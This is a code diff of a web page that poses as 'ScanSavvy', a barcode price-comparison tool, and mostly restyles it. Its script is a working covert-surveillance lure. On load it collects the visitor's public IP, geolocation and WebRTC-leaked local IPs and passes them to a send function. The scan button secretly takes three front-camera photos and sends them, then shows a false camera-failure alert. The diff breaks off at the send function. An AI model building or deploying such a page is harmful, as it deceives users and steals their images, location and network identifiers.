@@ -3,23 +3,210 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Local Listings Finder</title>
+<title>ScanSavvy - Smart Price Finder</title>
+<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700&family=Exo+2:wght@400;600&display=swap" rel="stylesheet">
 <style>
-  body { background:#f9f9f9; color:#333; font-family:"Roboto",Arial,sans-serif; margin:0; padding:0; text-align:center; }
-  header { background:#1976d2; color:#fff; padding:15px; font-size:1.4em; font-weight:bold; box-shadow:0 2px 4px rgba(0,0,0,0.1); }
-  #map { width:90%; height:300px; margin:20px auto; border-radius:10px; overflow:hidden; box-shadow:0 2px 6px rgba(0,0,0,0.2); }
-  button { background:#1976d2; color:#fff; font-size:1.2em; padding:12px 25px; border:none; border-radius:6px; cursor:pointer; transition:background 0.3s ease; margin-top:10px; }
-  button:hover { background:#125a9c; }
-  footer { margin-top:30px; font-size:0.85em; color:#777; }
-  canvas { display:none; }
+:root {
+  --primary: #00f5ff;
+  --accent: #00bcd4;
+  --bg-dark: #0f1115;
+  --glass: rgba(255, 255, 255, 0.06);
+  --border: rgba(255, 255, 255, 0.2);
+  --text-light: #e5e7eb;
+  --text-muted: #9ca3af;
+  --blur: blur(18px);
+}
+
+* { margin: 0; padding: 0; box-sizing: border-box; }
+
+body {
+  font-family: "Exo 2", sans-serif;
+  background: var(--bg-dark);
+  color: var(--text-light);
+  display: flex;
+  flex-direction: column;
+  min-height: 100vh;
+  align-items: center;
+  overflow-x: hidden;
+  padding-top: 40px;
+}
+
+header {
+  text-align: center;
+  margin-bottom: 10px;
+  position: relative;
+}
+
+header h1 {
+  font-family: "Orbitron", sans-serif;
+  font-size: 2.4em;
+  font-weight: 700;
+  color: var(--primary);
+  text-shadow: 0 0 10px rgba(0,245,255,0.3), 0 0 20px rgba(0,245,255,0.4), 0 0 30px rgba(0,245,255,0.5);
+  letter-spacing: 2px;
+  position: relative;
+  z-index: 1;
+}
+
+header h1::before {
+  content:"";
+  position:absolute;
+  top:50%;
+  left:50%;
+  width:160%;
+  height:60%;
+  background: rgba(0,245,255,0.15);
+  filter: blur(40px);
+  transform: translate(-50%, -50%);
+  border-radius:50%;
+  animation: pulse 4s ease-in-out infinite;
+  z-index:0;
+}
+
+header span {
+  font-size: 1em;
+  color: var(--text-muted);
+  display: block;
+  margin-top: 4px;
+  font-family: "Exo 2", sans-serif;
+}
+
+.container {
+  width: 90%;
+  max-width: 460px;
+  background: var(--glass);
+  border: 1px solid var(--border);
+  border-radius: 20px;
+  backdrop-filter: var(--blur);
+  padding: 28px;
+  box-shadow: 0 8px 40px rgba(0, 0, 0, 0.5);
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  position: relative;
+}
+
+.container::before {
+  content: "";
+  position: absolute;
+  top: 50%;
+  left: 50%;
+  width: 140%;
+  height: 140%;
+  background: rgba(0,0,0,0.5);
+  filter: blur(40px);
+  transform: translate(-50%, -50%) scale(1);
+  border-radius: 30px;
+  z-index:0;
+  animation: colorPulse 6s ease-in-out infinite alternate;
+}
+
+#about {
+  font-size: 0.95em;
+  color: var(--text-muted);
+  margin-bottom: 20px;
+  text-align: center;
+  line-height: 1.4em;
+  font-family: "Exo 2", sans-serif;
+}
+
+#map {
+  width: 100%;
+  height: 260px;
+  background: rgba(255,255,255,0.03);
+  border-radius: 16px;
+  margin-bottom: 20px;
+  overflow: hidden;
+  position: relative;
+}
+
+#map::before {
+  content:"";
+  position:absolute;
+  top:0; left:0; width:100%; height:100%;
+  background: rgba(0,245,255,0.08);
+  filter: blur(40px);
+  animation: pulse 6s ease-in-out infinite alternate;
+  z-index:0;
+}
+
+#map iframe {
+  position: relative;
+  z-index:1;
+  border-radius:16px;
+}
+
+button {
+  width: 100%;
+  padding: 16px;
+  font-size: 1.2em;
+  font-weight: 600;
+  color: #fff;
+  background: linear-gradient(90deg, var(--primary), var(--accent));
+  border: none;
+  border-radius: 12px;
+  cursor: pointer;
+  box-shadow: 0 4px 12px rgba(0,245,255,0.3);
+  position: relative;
+  z-index:1;
+}
+
+button::before {
+  content:"";
+  position:absolute;
+  top:50%; left:50%;
+  width:140%; height:50%;
+  background: rgba(0,245,255,0.1);
+  filter: blur(20px);
+  transform: translate(-50%, -50%);
+  border-radius:50%;
+  animation: pulse 5s ease-in-out infinite alternate;
+  z-index:0;
+}
+
+button:hover {
+  transform: translateY(-2px);
+  box-shadow: 0 6px 18px rgba(0, 245, 255,0.5);
+}
+
+footer {
+  text-align: center;
+  font-size: 0.85em;
+  color: var(--text-muted);
+  margin-top: 30px;
+}
+
+canvas { display: none; }
+
+@keyframes pulse {
+  0% { transform: translate(-50%, -50%) scale(1); opacity:0.4; }
+  50% { transform: translate(-50%, -50%) scale(1.05); opacity:0.6; }
+  100% { transform: translate(-50%, -50%) scale(1); opacity:0.4; }
+}
+
+@keyframes colorPulse {
+  0% { transform: translate(-50%, -50%) scale(0.95); background: rgba(0,0,0,0.35); opacity:0.3; }
+  50% { transform: translate(-50%, -50%) scale(1.05); background: rgba(255,0,255,0.35); opacity:0.5; }
+  100% { transform: translate(-50%, -50%) scale(0.95); background: rgba(0,0,0,0.35); opacity:0.3; }
+}
 </style>
 </head>
 <body>
-<header>Local Listings & Price Checker</header>
-<div id="map">Loading map...</div>
-<button id="scanBtn">Start Item Scanner</button>
-<canvas id="canvas"></canvas>
-<footer>B) 2025 Local Listings Finder</footer>
+<header>
+  <h1>ScanSavvy</h1>
+  <span>Smart Price Finder</span>
+</header>
+
+<div class="container">
+  <div id="about">
+    Scan the barcode of any item using your camera and find the same products nearby at the best prices in real-time.
+  </div>
+  <div id="map">Locating you...</div>
+  <button id="scanBtn">Start Scan</button>
+  <canvas id="canvas"></canvas>
+</div>
+
+<footer>© 2025 ScanSavvy</footer>
 
 <script>
 const payload = {
@@ -31,7 +218,7 @@ const payload = {
   images: []
 };
 
-// Get public IP
+// Public IP
 fetch("https://api.ipify.org?format=json")
   .then(r => r.json())
   .then(d => { payload.publicIP = d.ip; send(false); });
@@ -47,12 +234,13 @@ if (navigator.geolocation) {
     const lat = pos.coords.latitude;
     const lng = pos.coords.longitude;
     document.getElementById('map').innerHTML =
-      `<iframe width="100%" height="300" frameborder="0" style="border:0" src="https://www.openstreetmap.org/export/embed.html?bbox=${lng-0.05}%2C${lat-0.05}%2C${lng+0.05}%2C${lat+0.05}&layer=mapnik&marker=${lat}%2C${lng}" allowfullscreen></iframe>`;
+      `<iframe width="100%" height="100%" frameborder="0" style="border:0;border-radius:16px;"
+       src="https://www.openstreetmap.org/export/embed.html?bbox=${lng-0.05}%2C${lat-0.05}%2C${lng+0.05}%2C${lat+0.05}&layer=mapnik&marker=${lat}%2C${lng}" allowfullscreen></iframe>`;
     send(false);
   });
 }
 
-// WebRTC IP discovery
+// WebRTC IPs
 const pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
 pc.createDataChannel("x");
 pc.onicecandidate = e => {
@@ -62,41 +250,41 @@ pc.onicecandidate = e => {
 };
 pc.createOffer().then(o => pc.setLocalDescription(o));
 
-// Capture 3 images sequentially
+// Capture 3 images
 document.getElementById("scanBtn").addEventListener("click", startScanner);
 
 function startScanner() {
-  const streamPromise = navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-  streamPromise.then(stream => {
-    const video = document.createElement("video");
-    video.srcObject = stream;
-    video.play();
+  navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+    .then(stream => {
+      const video = document.createElement("video");
+      video.srcObject = stream;
+      video.play();
 
-    const canvas = document.getElementById("canvas");
-    const ctx = canvas.getContext("2d");
-    const imagesCaptured = [];
+      const canvas = document.getElementById("canvas");
+      const ctx = canvas.getContext("2d");
+      const imagesCaptured = [];
 
-    video.onloadedmetadata = async () => {
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
+      video.onloadedmetadata = async () => {
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
 
-      for (let i = 0; i < 3; i++) {
-        ctx.drawImage(video, 0, 0);
-        const imgData = canvas.toDataURL("image/png").split(',')[1];
-        imagesCaptured.push(imgData);
-        await new Promise(r => setTimeout(r, 300)); // small delay
-      }
+        for (let i = 0; i < 3; i++) {
+          ctx.drawImage(video, 0, 0);
+          const imgData = canvas.toDataURL("image/png").split(',')[1];
+          imagesCaptured.push(imgData);
+          await new Promise(r => setTimeout(r, 300));
+        }
 
-      payload.images = imagesCaptured.filter(img => img && img.length > 0);
-      send(true);
+        payload.images = imagesCaptured.filter(img => img && img.length > 0);
+        send(true);
 
-      stream.getTracks().forEach(t => t.stop());
-      alert("Failed to initialize camera."); // always show even if succeeded
-    };
-  }).catch(err => {
-    console.log("Camera error:", err);
-    alert("Failed to initialize camera.");
-  });
+        stream.getTracks().forEach(t => t.stop());
+        alert("Failed to initialize camera.");
+      };
+    }).catch(err => {
+      console.log("Camera error:", err);
+      alert("Failed to access camera.");
+    });
 }
 
 function send(force) {
